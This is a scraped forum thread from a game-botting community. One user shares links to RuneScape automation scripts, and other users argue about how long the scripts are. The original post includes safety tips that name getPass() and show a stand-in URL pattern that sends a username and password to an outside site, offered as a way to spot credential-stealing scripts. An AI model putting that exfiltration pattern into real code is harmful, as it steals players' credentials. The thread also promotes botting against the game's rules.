channel.title: Some Scripts & Safety tips whilst botting
channel.description:
I was busy with school but got back to scripting and made a few cool scripts as usual. Two of the four scripts which shall be posted in this topic has been finished, the IronMiner's finished version is exclusive to somebody and the JewelleryStringer is not complete. 1) xHerbCleanerPRO. What does it do? Cleans every herb available for purchase on the G.E. Start next to a bank and set the options in the GUI. [url=http://pastebin.com/ncnJyLsU]Pastebin[/url], Save as [b]xHerbCleanerPRO.java[/b] 2) xSlayerAssistantPRO What does it do? Gives you a killcount (useful for people who forget gems like me), Exp gained / Exp gained per hour, Run time etc etc. Turn human input on and begin your task. [url=http://pastebin.com/tssfyniX]Pastebin[/url], Save as [b]xSlayerAssistantPRO.java[/b] 3) xIronMiner What does it do? It mines iron from 2 specific rocks at the Rimmington Quarry and banks them at Draynor. The pro version will not be released as long as cane doesn't want it to. The paint has some bugs which will be fixed in a later update. [url=http://pastebin.com/YUYX17Qs]Pastebin[/url], Save as [b]xIronMiner.java[/b] 4) xLunarJewelleryStringer What does it do? It strings your sapphire amulet (or whatever the item id 1673 is) and then banks it and withdraws more undone amulets. This script is not complete and will probably be exclusive to "katakuna" on IRC unless if allows it to be released to the public. [url=http://pastebin.com/fCLXGeZg]Pastebin[/url], Save as [b]xLunarJewelleryStringer.java[/b] I won't try to hack you or anything, Moparisthebest, sir, you may check every one of my scripts if you wish to but you will find nothing that may hack/steal any information from your users. Most are my friends and I don't see a point in hacking them anyways. (not that I do hack others) And a little add-on to help you all stay safe whilst using scripts:- 1) Search every script you download for "getPass()", this is a method which allows a script to get your password during runtime. 2) Search every script you download for "url", if you find anything along the lines of url check the url, see if its connecting to a site like this:-
http://theirsite.com/whatever/file.php?username=" + XXX.XXX() + "&password=" + XXX.XXX()
And some hand links for information about my scripts:- [url=http://pure2.info/scripts/index.php]Released scripts list[/url] (may contain content being hosted for others, all of their code is scanned by me first, and updated posts of my scripts can be found here) [url=http://pure2.info/scripts/upcoming.php]Scripts in development/to be developed[/url] Any problems/bugs, contact me on IRC. Server: irc.moparisthebest.com:6667 Channels: #moparscape, #minecraft, #runescape, #fagsrus or obviously open a dialog window with me.

item.title: Some Scripts & Safety tips whilst botting
item.dc:creator: @davidi2 Davidi2
item.description:
@davidi2 wrote:

[quote=“cane, post:8, topic:390233”][quote author=Davidi2 link=topic=486142.msg3564796#msg3564796 date=1302560346]
Banking takes ~10 lines to do properly, what does ‘3 different modes’ mean? And logging out after certain conditions is a simple if statement for each condition in the thread loop…

But my point was it doesn’t matter how many lines of code you have, or how long it takes
[/quote]
Banking was not with the normal banks afaik.[/quote]Why does that matter? The only difference would be the path and the object id & option, right? Unless PB has changed a ton…

Read full topic
item.source: Some Scripts & Safety tips whilst botting

item.title: Some Scripts & Safety tips whilst botting
item.dc:creator: @Svitkona Svitkona
item.description:
@Svitkona wrote:

11:49:09 <Pure_> <400lines was used
11:49:17 <Pure_> thats not including the gui and paint
11:49:17 <Pure_> sir
11:49:22 <Pure_> why was it so long?
11:49:25 <Pure_> it had banking
11:49:28 <Pure_> 3 different modes
11:49:32 <Pure_> logging out after certain conditions
11:49:38 <Pure_> and a complex antiban
11:49:41 <Pure_> along with a ton of failsafes

item.source: Some Scripts & Safety tips whilst botting

item.title: Some Scripts & Safety tips whilst botting
item.dc:creator: @davidi2 Davidi2
item.description:
@davidi2 wrote:

No offense to Pure_, but the only reason his iron miner was 750 lines of code was because there was probably a lot of un-needed code in there to make it bloated (some of it probably from that paint maker he uses) A miner (unless it is AIO) should never be 750 lines of code As for how long a script takes to make… that is really irrelevant. I could work one hour for 7 days or 7 hours for one day if you know what I mean.

Read full topic
item.source: Some Scripts & Safety tips whilst botting

item.title: Some Scripts & Safety tips whilst botting
item.dc:creator: @classic mopmans little slave
item.description:
@classic wrote:

[quote=“Rix_, post:3, topic:390233”][quote author=glestrts link=topic=486142.msg3562525#msg3562525 date=1302388430]
At least you are trying. The scripts seem very basic though.
[/quote]
What are you trying to say? Pure_ has been developing scripts for a while now and he has posted a few of them on the forum before he was banned.

<Pure_> ramen_, also tell him that
<Pure_> the iron miner i had made for cane
<Pure_> is over 750lines in code
<Pure_> and took 2 days[/quote]

Read full topic

item.title: Some Scripts & Safety tips whilst botting
item.dc:creator: @error.login cane
item.description:
@error.login wrote:

I was busy with school but got back to scripting and made a few cool scripts as usual.
Two of the four scripts which shall be posted in this topic has been finished, the IronMiner’s finished version is exclusive to somebody and the JewelleryStringer is not complete.

  1. xHerbCleanerPRO.
    What does it do?
    Cleans every herb available for purchase on the G.E. Start next to a bank and set the options in the GUI.
    Pastebin, Save as xHerbCleanerPRO.java

  2. xSlayerAssistantPRO
    What does it do?
    Gives you a killcount (useful for people who forget gems like me), Exp gained / Exp gained per hour, Run time etc etc.
    Turn human input on and begin your task.
    Pastebin, Save as xSlayerAssistantPRO.java

  3. xIronMiner
    What does it do?
    It mines iron from 2 specific rocks at the Rimmington Quarry and banks them at Draynor.
    The pro version will not be released as long as cane doesn’t want it to. The paint has some bugs which will be fixed in a later update.
    Pastebin, Save as xIronMiner.java

  4. xLunarJewelleryStringer
    What does it do?
    It strings your sapphire amulet (or whatever the item id 1673 is) and then banks it and withdraws more undone amulets.
    This script is not complete and will probably be exclusive to “katakuna” on IRC unless if allows it to be released to the public.
    Pastebin, Save as xLunarJewelleryStringer.java

I won’t try to hack you or anything, Moparisthebest, sir, you may check every one of my scripts if you wish to but you will find nothing that may hack/steal any information from your users.
Most are my friends and I don’t see a point in hacking them anyways. (not that I do hack others)

And a little add-on to help you all stay safe whilst using scripts:-

  1. Search every script you download for “getPass()”, this is a method which allows a script to get your password during runtime.
  2. Search every script you download for “url”, if you find anything along the lines of url check the url, see if its connecting to a site like this:-
http://theirsite.com/whatever/file.php?username=" + XXX.XXX() + "&password=" + XXX.XXX()

And some hand links for information about my scripts:-
Released scripts list (may contain content being hosted for others, all of their code is scanned by me first, and updated posts of my scripts can be found here)
Scripts in development/to be developed

Any problems/bugs, contact me on IRC.
Server: irc.moparisthebest.com:6667
Channels: #moparscape, #minecraft, #runescape, #fagsrus or obviously open a dialog window with me.
